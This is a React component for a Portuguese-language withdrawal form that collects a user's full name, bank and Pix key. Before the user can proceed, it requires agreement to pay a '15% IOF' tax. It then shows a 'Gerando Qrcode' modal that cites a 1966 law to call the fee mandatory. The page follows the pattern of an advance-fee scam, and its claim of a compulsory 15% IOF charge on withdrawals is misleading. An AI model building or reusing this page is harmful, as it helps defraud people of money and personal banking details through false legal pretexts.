import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Menu } from "lucide-react";
import { Switch } from "@/components/ui/switch";
import {
  Dialog,
  DialogContent,
} from "@/components/ui/dialog";

const WithdrawForm = () => {
  const navigate = useNavigate();
  const [nomeCompleto, setNomeCompleto] = useState("");
  const [bancoDestinatario, setBancoDestinatario] = useState("");
  const [chavePix, setChavePix] = useState("");
  const [aceitaTermos, setAceitaTermos] = useState(false);
  const [errors, setErrors] = useState<{[key: string]: boolean}>({});
  const [showLoadingModal, setShowLoadingModal] = useState(false);

  const handleSubmit = () => {
    const newErrors: {[key: string]: boolean} = {};
    
    if (!nomeCompleto.trim()) newErrors.nomeCompleto = true;
    if (!bancoDestinatario.trim()) newErrors.bancoDestinatario = true;
    if (!chavePix.trim()) newErrors.chavePix = true;
    if (!aceitaTermos) newErrors.aceitaTermos = true;

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setShowLoadingModal(true);
    }
  };

  return (
    <div className="min-h-screen bg-primary flex flex-col font-serif max-w-md mx-auto">
      {/* Header */}
      <header className="flex items-center justify-between px-5 py-4 bg-primary">
        {/* Logo placeholder */}
        <div className="w-28 h-9 bg-foreground rounded-sm" />
        
        {/* Menu button */}
        <button className="flex items-center gap-2 text-foreground">
          <Menu className="w-6 h-6" strokeWidth={2} />
          <span className="text-base font-normal">Menu</span>
        </button>
      </header>

      {/* Main content */}
      <main className="flex-1 flex flex-col px-4 pt-6 pb-8">
        {/* Form Card */}
        <div className="bg-secondary rounded-[2rem] p-6 flex flex-col">
          {/* Title */}
          <h1 className="text-foreground text-[1.5rem] leading-[1.3] font-bold mb-6">
            Preencha o formulário para receber os valores solicitados.
          </h1>

          {/* Nome Completo */}
          <div className="mb-5">
            <label className="text-foreground text-lg font-medium block mb-2">
              Nome Completo
            </label>
            <input
              type="text"
              value={nomeCompleto}
              onChange={(e) => setNomeCompleto(e.target.value)}
              className={`w-full h-16 px-4 rounded-2xl border-2 bg-white text-foreground text-lg focus:outline-none focus:ring-2 focus:ring-primary ${
                errors.nomeCompleto ? "border-red-500" : "border-primary"
              }`}
            />
          </div>

          {/* Banco Destinatário */}
          <div className="mb-5">
            <label className="text-foreground text-lg font-medium block mb-2">
              Banco Destinatário
            </label>
            <input
              type="text"
              value={bancoDestinatario}
              onChange={(e) => setBancoDestinatario(e.target.value)}
              className={`w-full h-16 px-4 rounded-2xl border-2 bg-white text-foreground text-lg focus:outline-none focus:ring-2 focus:ring-primary ${
                errors.bancoDestinatario ? "border-red-500" : "border-primary"
              }`}
            />
          </div>

          {/* Chave Pix */}
          <div className="mb-6">
            <label className="text-foreground text-lg font-medium block mb-2">
              Chave Pix
            </label>
            <input
              type="text"
              value={chavePix}
              onChange={(e) => setChavePix(e.target.value)}
              className={`w-full h-16 px-4 rounded-2xl border-2 bg-white text-foreground text-lg focus:outline-none focus:ring-2 focus:ring-primary ${
                errors.chavePix ? "border-red-500" : "border-primary"
              }`}
            />
          </div>

          {/* Toggle Terms */}
          <div className={`flex items-start gap-3 mb-6 ${errors.aceitaTermos ? "text-red-500" : ""}`}>
            <Switch
              checked={aceitaTermos}
              onCheckedChange={setAceitaTermos}
              className="mt-1 data-[state=checked]:bg-primary data-[state=unchecked]:bg-muted"
            />
            <p className="text-foreground/80 text-sm leading-tight">
              Ao solicitar o saque para sua conta é necessário está de acordo com o pagamento de 15% do IOF (Imposto sobre Operações Financeiras)
            </p>
          </div>

          {/* Submit Button */}
          <button 
            onClick={handleSubmit}
            className="w-full py-5 bg-primary text-foreground rounded-full text-2xl font-normal"
          >
            Próximo
          </button>
        </div>

        {/* Loading Modal */}
        <Dialog open={showLoadingModal} onOpenChange={setShowLoadingModal}>
          <DialogContent className="bg-white rounded-3xl p-8 max-w-[320px] border-0 shadow-xl flex flex-col items-center gap-6">
            <h2 className="text-foreground text-2xl font-serif font-bold text-center">
              Gerando Qrcode
            </h2>
            
            {/* Yellow Spinner */}
            <div className="relative w-32 h-32">
              <svg className="w-full h-full animate-spin" viewBox="0 0 100 100">
                <circle
                  cx="50"
                  cy="50"
                  r="40"
                  stroke="hsl(var(--primary))"
                  strokeWidth="8"
                  fill="none"
                  strokeLinecap="round"
                  strokeDasharray="200"
                  strokeDashoffset="60"
                />
              </svg>
            </div>

            <p className="text-foreground/70 text-sm text-center leading-snug font-serif">
              O pagamento da taxa IOF é obrigatória conforme a Lei nº 5.143, de 20 de outubro de 1966.
            </p>
          </DialogContent>
        </Dialog>
      </main>
    </div>
  );
};

export default WithdrawForm;
